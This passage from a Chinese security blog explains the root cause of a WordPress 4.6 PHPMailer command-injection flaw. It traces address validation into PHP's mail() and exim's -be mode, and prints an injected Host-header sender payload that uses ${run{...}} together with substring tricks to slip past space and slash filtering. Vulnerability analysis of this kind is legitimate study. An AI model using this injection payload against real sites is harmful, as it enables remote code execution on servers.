                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">phpmailerException</span>(<span class="hljs-variable">$error_message</span>);
            }
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-variable language_">$this</span>-&gt;From = <span class="hljs-variable">$address</span>;
        <span class="hljs-variable language_">$this</span>-&gt;FromName = <span class="hljs-variable">$name</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$auto</span>) {
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;Sender)) {
                <span class="hljs-variable language_">$this</span>-&gt;Sender = <span class="hljs-variable">$address</span>;
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }</code></pre>
<p>其中<code>validateAddress()</code>函数在同文件下，函数前半部分如下</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$patternselect</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$patternselect</span> == <span class="hljs-string">'auto'</span>) {
            <span class="hljs-comment">//Check this constant first so it works when extension_loaded() is disabled by safe mode</span>
            <span class="hljs-comment">//Constant was added in PHP 5.2.4</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-string">'PCRE_VERSION'</span>)) {
                <span class="hljs-comment">//This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2</span>
                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">version_compare</span>(PCRE_VERSION, <span class="hljs-string">'8.0.3'</span>) &gt;= <span class="hljs-number">0</span>) {
                    <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'pcre8'</span>;
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'pcre'</span>;
                }
            } <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">'extension_loaded'</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">'pcre'</span>)) {
                <span class="hljs-comment">//Fall back to older PCRE</span>
                <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'pcre'</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">//Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension</span>
                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="hljs-string">'5.2.0'</span>) &gt;= <span class="hljs-number">0</span>) {
                    <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'php'</span>;
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'noregex'</span>;
                }
            }
        }</code></pre>
<p>经过测试发现<code>$patternselect</code>变量被设置为pcre8，因此在函数后面执行如下代码中的pcre8的case</p>
<pre><code class="hljs php"><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$patternselect</span>) {
          <span class="hljs-keyword">case</span> <span class="hljs-string">'pcre8'</span>:
              ...
          <span class="hljs-keyword">case</span> <span class="hljs-string">'pcre'</span>:
              ...
          <span class="hljs-keyword">case</span> <span class="hljs-string">'html5'</span>:
              ...
          <span class="hljs-keyword">case</span> <span class="hljs-string">'noregex'</span>:
		...
          <span class="hljs-keyword">case</span> <span class="hljs-string">'php'</span>:
          <span class="hljs-keyword">default</span>:
              ...
      }</code></pre>
<p>pcre8的代码注释</p>
<blockquote>
<p>Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.</p>
</blockquote>
<p>基于php内置的邮箱验证的基础上做的修改</p>
<blockquote>
<p><code>php</code> Use PHP built-in FILTER_VALIDATE_EMAIL;</p>
</blockquote>
<p>查阅php官网</p>
<p>![image-20221115091819538.png](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/1668523449643126528.png)</p>
<p>这个验证方式允许使用括号或双引号使邮箱地址包含空格，因此在Hosts字段构造的发件人的邮箱可以是</p>
<pre><code class="hljs plaintext">target(any -froot@localhost -be ${run{$payload}} null)@qq.com</code></pre>
<p>经过验证和过滤之后的函数调用</p>
<pre><code class="hljs php"><span class="hljs-variable">$phpmailer</span>
=&gt;<span class="hljs-title function_ invoke__">Send</span>()		wp-includes/pluggable.php<span class="hljs-comment">#471</span>
=&gt;<span class="hljs-title function_ invoke__">postSend</span>() 	wp-includes/<span class="hljs-class"><span class="hljs-keyword">class</span>-<span class="hljs-title">phpmailer</span>.<span class="hljs-title">php</span>#1125</span>
<span class="hljs-class">=&gt;<span class="hljs-title">mailSend</span>()	<span class="hljs-title">wp</span>-<span class="hljs-title">includes</span>/<span class="hljs-title">class</span>-<span class="hljs-title">phpmailer</span>.<span class="hljs-title">php</span>#1247</span>
<span class="hljs-class">=&gt;<span class="hljs-title">mailPassthru</span>()	<span class="hljs-title">wp</span>-<span class="hljs-title">includes</span>/<span class="hljs-title">class</span>-<span class="hljs-title">phpmailer</span>.<span class="hljs-title">php</span>#1368</span></code></pre>
<p>将payload传入到<code>mailPassthru()</code>函数中，函数代码如下</p>
<pre><code class="hljs javascript">private <span class="hljs-keyword">function</span> <span class="hljs-title function_">mailPassthru</span>(<span class="hljs-params">$to, $subject, $body, $header, $params</span>)
   {
       <span class="hljs-comment">//Check overloading of mail function to avoid double-encoding</span>
       <span class="hljs-keyword">if</span> (<span class="hljs-title function_">ini_get</span>(<span class="hljs-string">'mbstring.func_overload'</span>) &amp; <span class="hljs-number">1</span>) {
           $subject = $this-&gt;<span class="hljs-title function_">secureHeader</span>($subject);
       } <span class="hljs-keyword">else</span> {
           $subject = $this-&gt;<span class="hljs-title function_">encodeHeader</span>($this-&gt;<span class="hljs-title function_">secureHeader</span>($subject));
       }
       <span class="hljs-keyword">if</span> (<span class="hljs-title function_">ini_get</span>(<span class="hljs-string">'safe_mode'</span>) || !($this-&gt;<span class="hljs-title class_">UseSendmailOptions</span>)) {
           $result = @<span class="hljs-title function_">mail</span>($to, $subject, $body, $header);
       } <span class="hljs-keyword">else</span> {
           $result = @<span class="hljs-title function_">mail</span>($to, $subject, $body, $header, $params);
       }
       <span class="hljs-keyword">return</span> $result;
   }</code></pre>
<p>由于没有开启安全模式，因此调用的是<code>$result = @mail($to, $subject, $body, $header, $params);</code></p>
<p><code>@mail</code>是调用原生的<code>mail()</code>，在<code>/wp-includes/class-phpmailer.php</code>中定义</p>
<pre><code class="hljs javascript"><span class="hljs-comment">/**</span>
<span class="hljs-comment">    * Which method to use to send mail.</span>
<span class="hljs-comment">    * Options: "mail", "sendmail", or "smtp".</span>
<span class="hljs-comment">    * <span class="hljs-doctag">@var</span> <span class="hljs-variable">string</span></span>
<span class="hljs-comment">    */</span>
   public $Mailer = <span class="hljs-string">'mail'</span>;	
<span class="hljs-comment">/**</span>
<span class="hljs-comment">    * The path to the sendmail program.</span>
<span class="hljs-comment">    * <span class="hljs-doctag">@var</span> <span class="hljs-variable">string</span></span>
<span class="hljs-comment">    */</span>
   public $Sendmail = <span class="hljs-string">'/usr/sbin/sendmail'</span>;</code></pre>
<p>查阅php手册</p>
<pre><code class="hljs php"><span class="hljs-title function_ invoke__">mail</span>(
    <span class="hljs-keyword">string</span> <span class="hljs-variable">$to</span>,
    <span class="hljs-keyword">string</span> <span class="hljs-variable">$subject</span>,
    <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span>,
    <span class="hljs-keyword">array</span>|<span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_headers</span> = [],
    <span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_params</span> = <span class="hljs-string">""</span>
): <span class="hljs-keyword">bool</span></code></pre>
<p>对第五个参数有如下描述</p>
<blockquote>
<p>The <code>additional_params</code> parameter can be used to pass  additional flags as command line options to the program configured to be used when sending mail, as defined by the <code>sendmail_path</code> configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the <code>-f</code> sendmail option.</p>
<p>This parameter is escaped by escapeshellcmd() internally to prevent command execution. escapeshellcmd() prevents command execution, but allows to add additional parameters.  For security reasons, it is recommended for the user to sanitize this  parameter to avoid adding unwanted parameters to the shell command.</p>
<p>‘additional_params’参数可用于将附加标志作为命令行选项传递给配置为在发送邮件时使用的程序，如’  sendmail_path ‘配置设置所定义的那样。例如，当使用带有’-f’  sendmail选项的sendmail时，可以使用它来设置信封发送者地址。</p>
<p>该参数通过escapeshellcmd()在内部转义，以防止命令执行。escapeshellcmd()阻止命令的执行，但是允许添加额外的参数。出于安全考虑，建议用户对该参数进行消毒，以避免向shell命令添加不必要的参数。</p>
</blockquote>
<p>实际上phpmailer组件是调用linux系统命令<code>sendmail</code>进行邮件发送，命令格式为：<code>sendmail -t -i -fusername@hostname</code></p>
<p>mail() 执行后，会执行这样的指令 <code>sendmail -t -i -fwordpress@过滤后的数据包头中的Host字段值</code></p>
<p>另外<code>sendmail</code>符号链接到<code>exim4</code>，<code>exim4</code>的<code>-be</code>参数能开启字符串扩展测试模式，允许提取一些变量数据</p>
<p><code>$tod_log</code>返回系统时间，<code>$spool_directory</code>返回路径值<code>/var/spool/exim4</code>，因此可以用<code>${substr{10}{1}{$tod_log}}</code>代替空格、<code>${substr{0}{1}{$spool_directory}}</code>代替斜杠来绕过<code>-be</code>后面参数中空格和斜杠，以及<code>run</code>可以运行程序</p>
<p>因此上面提到的payload</p>
<p>因此上面提到的payload</p>
<pre><code class="hljs javascript"><span class="hljs-title function_">target</span>(any -froot@localhost -be ${run{$payload}} <span class="hljs-literal">null</span>)</code></pre>
<p>最后变成</p>
<pre><code class="hljs javascript">sendmail -t -i -fwordpress@<span class="hljs-title function_">target</span>(any -froot@localhost -be ${run{$payload}} <span class="hljs-literal">null</span>)</code></pre>
<p>这样就可以执行run中的命令</p>
<p>如果直接在命令行里使用，需要给run加引号</p>
<p>![image-20230829161640747](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829161640747.png)</p>
<h2 id="0x07-参考文章">0x07 参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40228200/article/details/128461257">wordpress 4.6任意命令执行漏洞（PwnScriptum）复现</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2301">WordPress &lt;= 4.6 命令执行漏洞(PHPMailer)(CVE-2016-10033)复现分析</a></p>
<p>[<a target="_blank" rel="noopener" href="https://wuxiuo.com/archives/83">WordPress 4.6 任意命令执行漏洞 (PwnScriptum)</a>](<a target="_blank" rel="noopener" href="https://wuxiuo.com/archives/83">https://wuxiuo.com/archives/83</a>)</p>
<p><a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/383372">深入分析WordPress4.6(PHPMailer)命令执行漏洞(CVE-2016-10033)</a></p>
<p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/wordpress/pwnscriptum/">Wordpress 4.6 远程代码执行漏洞（PwnScriptum）</a></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/08/30/moectf-2023-wp/">MoeCTF 2023 - 持续更新</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/08/24/easy-web/">攻防世界-easy_web</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0"><span class="toc-text">0x01 漏洞简述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6"><span class="toc-text">漏洞触发条件：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E6%90%AD%E5%BB%BA"><span class="toc-text">0x02 漏洞搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">0x03 漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">0x04 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9-shell"><span class="toc-text">反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9Dwebshell"><span class="toc-text">写入一句话webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-poc"><span class="toc-text">0x05 POC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E9%9C%80%E8%A6%81%E4%BF%AE%E6%94%B9%E7%9A%84%E9%83%A8%E5%88%86"><span class="toc-text">脚本需要修改的部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E7%9A%84%E4%B8%BB%E8%A6%81%E6%B5%81%E7%A8%8B"><span class="toc-text">脚本的主要流程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%B7%B1%E5%85%A5"><span class="toc-text">0x06 漏洞原理深入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">0x07 参考文章</span></a></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
